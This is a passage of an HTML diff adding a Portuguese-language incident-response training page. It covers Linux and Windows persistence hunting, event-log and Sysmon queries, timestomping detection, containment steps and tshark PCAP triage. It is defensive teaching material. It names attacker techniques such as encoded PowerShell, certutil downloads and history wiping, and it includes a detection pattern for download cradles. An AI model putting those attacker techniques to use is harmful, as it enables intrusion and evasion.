+<span class="k">cp</span> /proc/&lt;PID&gt;/exe /root/evidencia_pid.bin &amp;&amp; <span class="k">sha256sum</span> /root/evidencia_pid.bin</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span>Processos filhos coerentes (<code>httpd</code> não invoca <code>bash</code>) e conexões de saída apenas para serviços esperados.</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span>Processo <code>apache</code> filho abrindo conexão <code>ESTAB</code> para porta externa alta ou <code>/proc/4412/exe -&gt; /dev/shm/.sync (deleted)</code>.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-lin-proc" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 5 Persistência Linux -->
+  <div class="v" data-cat="pers">
+    <div class="top"><div class="ttl"><h3><span class="os lin">PERSISTÊNCIA</span>Caça a persistência no Linux (Cron, SSH keys, systemd e UID 0)</h3><div class="cat">descobrir todas as portas dos fundos antes de devolver o servidor</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div>
+        <p>Se você apenas fechar a falha inicial sem varrer os pontos de persistência, o invasor volta minutos depois. Verifique sempre os 5 esconderijos preferidos no Linux: tarefas agendadas (<code>cron</code>), chaves públicas adicionadas em <code>authorized_keys</code>, unidades <code>systemd</code> recém-criadas, perfis de shell (<code>.bashrc</code>) e contas extras com <code>UID 0</code> em <code>/etc/passwd</code>.</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># 1) Varrer TODOS os diretórios de cron do sistema e de usuários:</span>
+<span class="k">cat</span> /etc/crontab /etc/cron.d/* /var/spool/cron/* /var/spool/cron/crontabs/* 2&gt;/dev/null
+
+<span class="c"># 2) Conferir chaves SSH autorizadas em todas as contas (inclusive root):</span>
+<span class="k">head</span> -n 20 /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys 2&gt;/dev/null
+
+<span class="c"># 3) Checar contas com UID 0 (além do root legítimo) e serviços systemd recentes:</span>
+<span class="k">awk</span> -F: '($3 == 0) {print $1}' /etc/passwd
+<span class="k">find</span> /etc/systemd/system -maxdepth 2 -type f -mtime -7</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span>Apenas <code>root</code> tem UID 0; chaves SSH e tarefas agendadas documentadas pela equipe.</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span>Linha oculta em <code>/var/spool/cron/root</code> conectando para fora a cada 5 minutos ou chave SSH desconhecida no <code>root</code>.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-lin-pers" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 6 Timeline de arquivos & Timestomping -->
+  <div class="v" data-cat="audit">
+    <div class="top"><div class="ttl"><h3><span class="os lin">FILESYSTEM</span>Linha do tempo de arquivos e detecção de Timestomping (find / stat)</h3><div class="cat">mtime (conteúdo) vs. ctime (metadado/inode)</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div>
+        <p>Quando você descobre o horário da invasão nos logs, o próximo passo é listar todos os arquivos criados/alterados naquela janela. Atacantes avançados usam <code>touch -r</code> para falsificar a data de modificação (<code>Modify / mtime</code>) de uma backdoor igualando-a a arquivos antigos (<i>Timestomping</i>) — mas o kernel atualiza o <b><code>Change / ctime</code></b> com a data real em que o arquivo foi plantado!</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># Listar arquivos com metadado/inode alterado nas últimas 24h (-ctime -1) em /var/www e /etc:</span>
+<span class="k">find</span> /var/www /etc -type f -ctime -1 -ls 2&gt;/dev/null
+
+<span class="c"># Inspecionar os 4 timestamps de um arquivo suspeito (Access, Modify, Change, Birth):</span>
+<span class="k">stat</span> /var/www/html/includes/helper.php</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span><code>Modify</code> e <code>Change</code> coerentes com a janela de deploy oficial da equipe.</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span><code>Modify: 2023-01-10</code>, mas <code>Change: 2026-11-24 03:14:22</code> — prova clara de <i>timestomping</i>!</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-lin-time" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 7 Histórico e Anti-forense -->
+  <div class="v" data-cat="audit">
+    <div class="top"><div class="ttl"><h3><span class="os lin">ARTEFATOS</span>Histórico de comandos (.bash_history) e sinais de anti-forense</h3><div class="cat">reconstruir ações interativas ou provar limpeza deliberada</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div>
+        <p>Arquivos de histórico (<code>.bash_history</code>, <code>.zsh_history</code>, <code>.mysql_history</code>, <code>.viminfo</code>) revelam passo a passo o que foi digitado. Se o atacante rodou <code>unset HISTFILE</code> ou criou um link simbólico <code>.bash_history -&gt; /dev/null</code>, o link em si é um forte indicador forense de evasão.</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># Verificar permissões/links simbólicos e ler históricos de todas as contas:</span>
+<span class="k">ls</span> -la /root/.*history /home/*/.*history 2&gt;/dev/null
+<span class="k">tail</span> -n 40 /root/.bash_history /home/*/.bash_history 2&gt;/dev/null</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span>Arquivo regular <code>-rw-------</code> contendo apenas rotina administrativa conhecida.</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span>Comandos de download/compactação de dados em <code>/tmp</code> ou link <code>.bash_history -&gt; /dev/null</code>.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-lin-hist" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 8 auditd ausearch -->
+  <div class="v" data-cat="audit">
+    <div class="top"><div class="ttl"><h3><span class="os lin">AUDITD</span>Reconstrução pelo kernel com ausearch e aureport</h3><div class="cat">/var/log/audit/audit.log · rastreia EXECVE e alterações críticas</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div>
+        <p>Mesmo que o invasor não deixe histórico no bash, o subsistema de auditoria do kernel (<code>auditd</code>) registra chamadas de execução (<code>EXECVE</code>), logins e toques em arquivos vigiados com o <b><code>auid</code> (Audit UID original)</b> — revelando qual usuário real entrou antes de virar <code>root</code>!</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># Resumo geral de eventos de autenticação, falhas e executáveis:</span>
+<span class="k">aureport</span> --summary
+<span class="k">aureport</span> -x --summary | tail -15              <span class="c"># binários executados</span>
+
+<span class="c"># Buscar eventos por chave configurada (-k) com tradução legível (-i):</span>
+<span class="k">ausearch</span> -k identity_changes -i
+<span class="k">ausearch</span> -m EXECVE -ts today -i | tail -30</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span>Alterações em arquivos sensíveis associadas apenas a janelas de manutenção autorizadas.</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span>Registro <code>SYSCALL/EXECVE</code> mostrando <code>auid=1002(deploy) uid=0(root)</code> editando <code>/etc/sudoers</code> na madrugada.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-lin-audit" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 9 Contenção Linux -->
+  <div class="v" data-cat="cont">
+    <div class="top"><div class="ttl"><h3><span class="os lin">CONTENÇÃO</span>Contenção e erradicação cirúrgica no Linux (sem perder evidências)</h3><div class="cat">preservar hash → bloquear C2 → travar conta → encerrar processo → limpar persistência</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / ordem correta</div>
+        <p>Na pressa, apagar o binário malicioso antes de copiá-lo e tirar o hash destrói o IOC que o SOC precisa para varrer o resto da empresa. Siga sempre a sequência disciplinada: <b>1º Preservar evidência + SHA-256 → 2º Bloquear IP do C2/atacante no firewall → 3º Travar conta comprometida → 4º Encerrar processo malicioso e limpar persistência</b>.</p></div>
+      <div class="blk"><div class="h fix"><span class="d"></span>Como executar</div>
+<pre><span class="c"># 1) Copiar artefato para cofre de evidências e registrar hash SHA-256:</span>
+<span class="k">mkdir</span> -p /root/ir_case &amp;&amp; <span class="k">cp</span> -p /tmp/.beacon /root/ir_case/ &amp;&amp; <span class="k">sha256sum</span> /root/ir_case/.beacon &gt; /root/ir_case/hashes.txt
+
+<span class="c"># 2) Bloquear comunicação com o IP do atacante/C2 no firewall:</span>
+<span class="k">firewall-cmd</span> --add-rich-rule='rule family="ipv4" source address="198.51.100.44" drop' --permanent &amp;&amp; <span class="k">firewall-cmd</span> --reload
+
+<span class="c"># 3) Bloquear conta comprometida, encerrar processos do invasor e remover artefato/cron:</span>
+<span class="k">usermod</span> -L conta_invadida
+<span class="k">kill</span> -9 &lt;PID_MALICIOSO&gt; &amp;&amp; <span class="k">rm</span> -f /tmp/.beacon</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r vuln"><span class="lab">🔴 Erro comum</span>Rodar <code>rm -rf /tmp/*</code> e <code>reboot</code> de imediato — perde RAM, conexões e hash do malware.</div>
+        <div class="r safe"><span class="lab">🟢 Resposta correta</span>Amostra e hash salvos, IP bloqueado no firewall, conta travada, persistência limpa e serviço legítimo no ar.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-lin-cont" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===================== C · IR & LOGS WINDOWS ===================== -->
+<div class="apanel" id="c-win">
+  <div class="filters" id="cf-win">
+    <span class="pill on" data-f="all">Todos</span>
+    <span class="pill" data-f="evid">Event IDs</span>
+    <span class="pill" data-f="ps">Processos &amp; PS</span>
+    <span class="pill" data-f="pers">Persistência</span>
+    <span class="pill" data-f="art">Artefatos</span>
+    <span class="pill" data-f="cont">Contenção</span>
+  </div>
+  <div class="count" id="cc-win"></div>
+
+  <div class="disc" style="border-color:var(--acc2);background:#0c1c2e">
+    📌 <b>Mapa rápido dos Event IDs mais cobrados em investigações Windows:</b><br>
+    <code>4624</code> Logon com sucesso · <code>4625</code> Falha de logon (força bruta) · <code>4672</code> Privilégios admin atribuídos · <code>4688</code> Processo criado · <code>4698</code> Tarefa agendada criada · <code>4720</code> Usuário criado · <code>4732</code> Adicionado a grupo local · <code>7045</code> Novo serviço instalado (System) · <code>1102</code> Log de Segurança apagado! · <code>4104</code> PowerShell Script Block · <b>Sysmon:</b> <code>1</code> Processo+Hash · <code>3</code> Rede · <code>11</code> Arquivo · <code>22</code> DNS.
+  </div>
+
+  <!-- 1 Logons 4624 / 4625 -->
+  <div class="v" data-cat="evid">
+    <div class="top"><div class="ttl"><h3><span class="os win">EVENT LOG</span>Investigação de Logons e Força Bruta (Event IDs 4624, 4625 e Logon Types)</h3><div class="cat">Security.evtx · diferenciar logon local (2), SMB/rede (3) e RDP (10)</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / o que procurar</div>
+        <p>No log <b>Security</b>, uma sequência de <code>4625</code> seguida de <code>4624</code> (e <code>4672</code> logo depois) indica comprometimento de credencial com privilégio administrativo. Observe sempre o campo <b>Logon Type</b>: <code>Type 2</code> (console local), <code>Type 3</code> (rede/SMB/WinRM — movimento lateral!), <code>Type 5</code> (serviço) e <code>Type 10</code> (acesso remoto gráfico RDP).</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar (PowerShell)</div>
+<pre><span class="c"># Contar falhas de logon (4625) recentes:</span>
+<span class="k">Get-WinEvent</span> -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 50 | select TimeCreated,Message
+
+<span class="c"># Filtrar logons bem-sucedidos (4624) remotos (Type 3 ou Type 10):</span>
+<span class="k">Get-WinEvent</span> -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 30 |
+  Where-Object { $_.Message -match 'Logon Type:\s+(3|10)' } | select TimeCreated,Id,Message</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span>Logons de estações internas conhecidas, sem picos de erro <code>4625</code> nem RDP fora de horário.</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span>Dezenas de <code>4625</code> seguidos de <code>4624 (Logon Type 10)</code> na conta <code>Administrador</code> vindo de IP inesperado.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-win-logon" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 2 Contas backdoor & 1102 -->
+  <div class="v" data-cat="evid">
+    <div class="top"><div class="ttl"><h3><span class="os win">EVENT LOG</span>Contas Backdoor, Escalonamento de Grupo e Log Apagado (4720, 4732, 1102)</h3><div class="cat">detectar criação de admin oculto e tentativa de apagar rastros</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div>
+        <p>Após conseguir acesso inicial, invasores costumam criar uma conta local/domínio reserva (<code>4720</code>), colocá-la em <code>Administrators</code> (<code>4732</code>) ou <code>Domain Admins</code> (<code>4728</code>) e limpar o Event Viewer. Quando apagam o log Security, o próprio Windows grava imediatamente o <b>Event ID <code>1102</code> (The audit log was cleared)</b> com o usuário responsável!</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="k">Get-WinEvent</span> -FilterHashtable @{LogName='Security'; Id=4720,4728,4732,1102} -ErrorAction SilentlyContinue |
+  select TimeCreated,Id,Message</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span>Zero ocorrências de <code>1102</code>; criações de conta (<code>4720</code>) vinculadas a chamados formais de RH/TI.</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span>Evento <code>4720</code> criando conta <code>svc_support$</code> + <code>4732</code> em <code>Administrators</code> ou presença de <code>1102</code>.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-win-acct" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 3 Processos 4688 e PowerShell 4104 -->
+  <div class="v" data-cat="ps">
+    <div class="top"><div class="ttl"><h3><span class="os win">EXECUÇÃO</span>Processos e PowerShell Ofuscado (Event ID 4688 e 4104)</h3><div class="cat">Microsoft-Windows-PowerShell/Operational · decodificar Base64 com segurança</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div>
+        <p>Atacantes em Windows abusam intensamente de <code>powershell.exe -nop -w hidden -enc &lt;Base64&gt;</code> e LOLBins (<code>certutil -urlcache</code>, <code>rundll32</code>, <code>mshta</code>). Mesmo que a linha de comando esteja codificada no evento <code>4688</code>, o <b>Script Block Logging (Event ID <code>4104</code>)</b> registra o bloco de código já desdobrado pelo motor do PowerShell!</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># Inspecionar blocos de script suspeitos registrados no log operacional do PowerShell:</span>
+<span class="k">Get-WinEvent</span> -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} -MaxEvents 25 |
+  Where-Object { $_.Message -match 'DownloadString|Invoke-|FromBase64String|Net\.WebClient' } | select TimeCreated,Message
+
+<span class="c"># Decodificar string -EncodedCommand (UTF-16LE) APENAS como texto (nunca use Invoke-Expression!):</span>
+[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("&lt;STRING_BASE64&gt;"))</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span>Scripts administrativos internos conhecidos e assinados.</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span>Evento <code>4104</code> baixando script externo de IP desconhecido ou gravando persistência em <code>C:\ProgramData\</code>.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-win-ps" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 4 Sysmon -->
+  <div class="v" data-cat="ps">
+    <div class="top"><div class="ttl"><h3><span class="os win">SYSMON</span>Telemetria avançada com Sysmon (IDs 1, 3, 11 e 22)</h3><div class="cat">hashes de processo, conexões de rede por .exe e consultas DNS</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div>
+        <p>O <b>Sysmon</b> entrega num único canal o que o log padrão do Windows não mostra: <code>ID 1</code> (processo criado já com <code>ParentImage</code> + <b>hash SHA-256</b>), <code>ID 3</code> (qual executável abriu conexão TCP para qual IP), <code>ID 11</code> (arquivo criado em disco) e <code>ID 22</code> (qual processo consultou qual domínio DNS).</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># Listar conexões de rede iniciadas por processos (Sysmon ID 3) e consultas DNS (ID 22):</span>
+<span class="k">Get-WinEvent</span> -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1,3,22} -MaxEvents 30 |
+  select TimeCreated,Id,Message</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span>Navegadores e agentes corporativos conectando em domínios esperados.</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span><code>Sysmon ID 1</code>: <code>w3wp.exe</code> (IIS) gerando <code>cmd.exe / powershell.exe</code> + <code>ID 3</code> conectando a IP externo.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-win-sysmon" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 5 Persistência Windows -->
+  <div class="v" data-cat="pers">
+    <div class="top"><div class="ttl"><h3><span class="os win">PERSISTÊNCIA</span>Caça a persistência no Windows (Serviços 7045, Tarefas 4698 e Chaves Run)</h3><div class="cat">Registry Run/RunOnce · Scheduled Tasks · Services em pastas temporárias</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / o que procurar</div>
+        <p>Binários legítimos do Windows residem em <code>C:\Windows\System32</code> ou <code>C:\Program Files</code>. Qualquer chave de inicialização (<code>Run</code>), Tarefa Agendada ou Serviço apontando para <code>C:\Users\Public</code>, <code>C:\ProgramData</code>, <code>AppData\Local\Temp</code> ou chamando <code>powershell/cmd</code> é altíssimo indício de persistência maliciosa.</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># 1) Novos serviços instalados no log System (Event ID 7045):</span>
+<span class="k">Get-WinEvent</span> -FilterHashtable @{LogName='System'; Id=7045} -ErrorAction SilentlyContinue | select TimeCreated,Message
+
+<span class="c"># 2) Chaves de Registro Run / RunOnce (HKLM e HKCU):</span>
+<span class="k">Get-ItemProperty</span> "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run","HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+
+<span class="c"># 3) Tarefas agendadas fora do namespace padrão da Microsoft:</span>
+<span class="k">Get-ScheduledTask</span> | Where-Object { $_.TaskPath -notlike "\Microsoft\*" } | select TaskName,TaskPath,State</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span>Apenas agentes oficiais assinados pela empresa/fabricante nas chaves e serviços.</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span>Evento <code>7045</code> registrando serviço <code>WinUpdaterSvc</code> apontando para <code>C:\ProgramData\upd.exe</code>.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-win-pers" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 6 Rede, Processos e Artefatos Windows -->
+  <div class="v" data-cat="art">
+    <div class="top"><div class="ttl"><h3><span class="os win">ARTEFATOS</span>Conexões ativas, Assinatura Digital e Artefatos de Disco (Prefetch / MFT)</h3><div class="cat">Get-NetTCPConnection · Authenticode · Prefetch prova execução passada</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div>
+        <p>Em triagem ao vivo, cruze conexões <code>Established</code> com o caminho e a assinatura digital do processo. Já em forense de disco, mesmo que o invasor apague o <code>.exe</code>, o arquivo <b><code>C:\Windows\Prefetch\NOME.EXE-HASH.pf</code></b> (e o <code>Amcache</code> / <code>$MFT</code>) prova que aquele binário existiu, quantas vezes rodou e o horário da última execução!</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># Ligar conexão externa ativa ao processo e validar assinatura digital:</span>
+<span class="k">Get-NetTCPConnection</span> -State Established | select LocalPort,RemoteAddress,RemotePort,OwningProcess
+<span class="k">Get-Process</span> -Id &lt;PID&gt; | select Id,ProcessName,Path
+<span class="k">Get-AuthenticodeSignature</span> "C:\ProgramData\upd.exe"
+
+<span class="c"># Verificar artefatos Prefetch recentes (prova de execução mesmo após exclusão):</span>
+<span class="k">Get-ChildItem</span> C:\Windows\Prefetch\*.pf | Sort-Object LastWriteTime -Descending | select -First 10 Name,LastWriteTime</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span><code>Status: Valid</code> na assinatura Authenticode e sem executáveis desconhecidos no Prefetch.</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span><code>Status: NotSigned</code> em executável conectado para fora ou rastro <code>MIMIKATZ.EXE-*.pf</code> no Prefetch.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-win-net" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 7 Contenção Windows -->
+  <div class="v" data-cat="cont">
+    <div class="top"><div class="ttl"><h3><span class="os win">CONTENÇÃO</span>Contenção e erradicação segura no Windows</h3><div class="cat">Get-FileHash → Firewall Block → Disable-LocalUser/ADAccount → parar serviço/tarefa</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / ordem correta</div>
+        <p>Colete primeiro o hash SHA-256 do artefato suspeito e exporte os logs relevantes (<code>wevtutil epl</code>), depois corte a comunicação com o C2 via Firewall, desative contas comprometidas/backdoor e remova o serviço ou tarefa agendada persistente.</p></div>
+      <div class="blk"><div class="h fix"><span class="d"></span>Como executar (PowerShell)</div>
+<pre><span class="c"># 1) Registrar hash SHA-256 e copiar evidência:</span>
+<span class="k">Get-FileHash</span> "C:\ProgramData\upd.exe" -Algorithm SHA256
+
+<span class="c"># 2) Bloquear IP do C2 na saída/entrada do Windows Firewall:</span>
+<span class="k">New-NetFirewallRule</span> -DisplayName "IR Block C2" -Direction Outbound -RemoteAddress 203.0.113.77 -Action Block
+
+<span class="c"># 3) Desabilitar conta backdoor e parar/remover serviço malicioso:</span>
+<span class="k">Disable-LocalUser</span> -Name "svc_support$"
+<span class="k">Stop-Service</span> -Name "WinUpdaterSvc" -Force; <span class="k">sc.exe</span> delete "WinUpdaterSvc"</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r vuln"><span class="lab">🔴 Erro comum</span>Formatar ou apagar o arquivo sem anotar o hash SHA-256 nem bloquear o IP do C2 para os demais hosts.</div>
+        <div class="r safe"><span class="lab">🟢 Resposta correta</span>Hash documentado, tráfego C2 bloqueado, conta desativada e persistência erradicada.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-win-cont" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===================== C · REDE, PCAP & SIEM ===================== -->
+<div class="apanel" id="c-net">
+  <div class="filters" id="cf-net">
+    <span class="pill on" data-f="all">Todos</span>
+    <span class="pill" data-f="pcap">PCAP &amp; Wireshark</span>
+    <span class="pill" data-f="dns">DNS &amp; C2</span>
+    <span class="pill" data-f="siem">SIEM (SPL / KQL)</span>
+    <span class="pill" data-f="phish">Phishing &amp; E-mail</span>
+  </div>
+  <div class="count" id="cc-net"></div>
+
+  <div class="vfig" style="margin:0 0 18px">
+    <svg viewBox="0 0 880 120" xmlns="http://www.w3.org/2000/svg" font-family="monospace">
+      <defs><marker id="na3" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#f87171"/></marker></defs>
+      <rect x="16" y="22" width="185" height="66" rx="9" fill="#2a220e" stroke="#fbbf24"/>
+      <text x="108" y="46" fill="#fbbf24" font-size="11" font-weight="700" text-anchor="middle">1. Recon / Scan</text>
+      <text x="108" y="66" fill="#97a6c0" font-size="9.5" text-anchor="middle">Rajada SYN → RST,ACK</text>
+      <line x1="201" y1="55" x2="236" y2="55" stroke="#f87171" stroke-width="2" marker-end="url(#na3)"/>
+
+      <rect x="242" y="22" width="195" height="66" rx="9" fill="#2a1115" stroke="#f87171"/>
+      <text x="339" y="46" fill="#f87171" font-size="11" font-weight="700" text-anchor="middle">2. Acesso / Exploit</text>
+      <text x="339" y="66" fill="#97a6c0" font-size="9.5" text-anchor="middle">Brute force / Upload HTTP</text>
+      <line x1="437" y1="55" x2="472" y2="55" stroke="#f87171" stroke-width="2" marker-end="url(#na3)"/>
+
+      <rect x="478" y="22" width="185" height="66" rx="9" fill="#241c3a" stroke="#a78bfa"/>
+      <text x="570" y="46" fill="#a78bfa" font-size="11" font-weight="700" text-anchor="middle">3. Beaconing C2</text>
+      <text x="570" y="66" fill="#97a6c0" font-size="9.5" text-anchor="middle">Conexões fixas a cada Ns</text>
+      <line x1="663" y1="55" x2="698" y2="55" stroke="#f87171" stroke-width="2" marker-end="url(#na3)"/>
+
+      <rect x="704" y="22" width="160" height="66" rx="9" fill="#10243a" stroke="#38bdf8"/>
+      <text x="784" y="46" fill="#38bdf8" font-size="11" font-weight="700" text-anchor="middle">4. Exfiltração</text>
+      <text x="784" y="66" fill="#97a6c0" font-size="9.5" text-anchor="middle">POST alto / DNS Tunnel</text>
+    </svg>
+    <div class="cap">Os discos podem ser limpos pelo atacante, mas uma captura PCAP ou telemetria de rede preserva exatamente o que trafegou no fio.</div>
+  </div>
+
+  <!-- 1 tshark / Wireshark -->
+  <div class="v" data-cat="pcap">
+    <div class="top"><div class="ttl"><h3><span class="os net">PCAP</span>Triagem rápida de capturas com Wireshark e tshark</h3><div class="cat">achar rapidamente os IPs envolvidos, protocolos e maiores fluxos</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div>
+        <p>Um arquivo <code>.pcap</code> pode ter centenas de milhares de pacotes — rolar pacote por pacote faz perder tempo precioso. Comece sempre pelo <b>resumo de conversas IP e hierarquia de protocolos</b> para enxergar imediatamente quem falou com quem, por quanto tempo e qual o volume transferido.</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># Resumo das conversas IP e da hierarquia de protocolos via terminal (tshark):</span>
+<span class="k">tshark</span> -r captura.pcap -q -z conv,ip
+<span class="k">tshark</span> -r captura.pcap -q -z io,phs
+
+<span class="c"># Filtros essenciais de exibição no Wireshark:</span>
+ip.addr == 198.51.100.44                      <span class="c"># isolar tudo de/para um IP suspeito</span>
+http.request or tls.handshake.type == 1       <span class="c"># ver requisições HTTP e SNI de conexões TLS</span></pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span>Conversas concentradas entre clientes e servidores previstos em portas padrão.</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span>Conversa longa ou volumosa entre servidor interno e IP externo desconhecido em porta incomum (ex.: 4444, 8443).</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-net-tshark" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 2 Port Scan & Brute Force -->
+  <div class="v" data-cat="pcap">
+    <div class="top"><div class="ttl"><h3><span class="os net">PCAP</span>Detecção de Port Scan (Nmap) e Brute Force em capturas</h3><div class="cat">tcp.flags.syn==1 and tcp.flags.ack==0 · identificar paciente zero e timestamp</div></div><div class="chev">›</div></div>
+    <div class="body">
+      <div class="blk"><div class="h what"><span class="d"></span>O que é / o que procurar</div>
+        <p>Uma varredura TCP SYN dispara milhares de pacotes <code>SYN</code> para portas distintas em poucos segundos, recebendo <code>RST,ACK</code> das fechadas e <code>SYN,ACK</code> apenas das abertas. Logo após descobrir as portas abertas, o mesmo IP costuma iniciar o ataque contra o serviço encontrado.</p></div>
+      <div class="blk"><div class="h find"><span class="d"></span>Como investigar</div>
+<pre><span class="c"># Contar quem mais disparou pacotes SYN iniciais (identifica o scanner na hora):</span>
+<span class="k">tshark</span> -r captura.pcap -Y "tcp.flags.syn==1 &amp;&amp; tcp.flags.ack==0" -T fields -e ip.src | <span class="k">sort</span> | <span class="k">uniq</span> -c | <span class="k">sort</span> -nr
+
+<span class="c"># Ver quais portas do servidor realmente responderam SYN,ACK (portas abertas descobertas):</span>
+<span class="k">tshark</span> -r captura.pcap -Y "tcp.flags.syn==1 &amp;&amp; tcp.flags.ack==1" -T fields -e tcp.srcport | <span class="k">sort</span> -u</pre></div>
+      <div class="interp"><div class="rr">
+        <div class="r safe"><span class="lab">🟢 Estado normal</span>Poucos pacotes SYN seguidos de handshake completo (SYN → SYN,ACK → ACK) em portas de serviço.</div>
+        <div class="r vuln"><span class="lab">🔴 Indicador de invasão</span>1.000+ pacotes SYN vindos de um único IP em segundos varrendo portas 1–1024.</div>
+      </div></div>
+      <button class="trainbtn" data-clab="ir-net-scan" type="button">🎮 Treinar</button>
+    </div>
+  </div>
+
+  <!-- 3 HTTP Stream & Extração -->
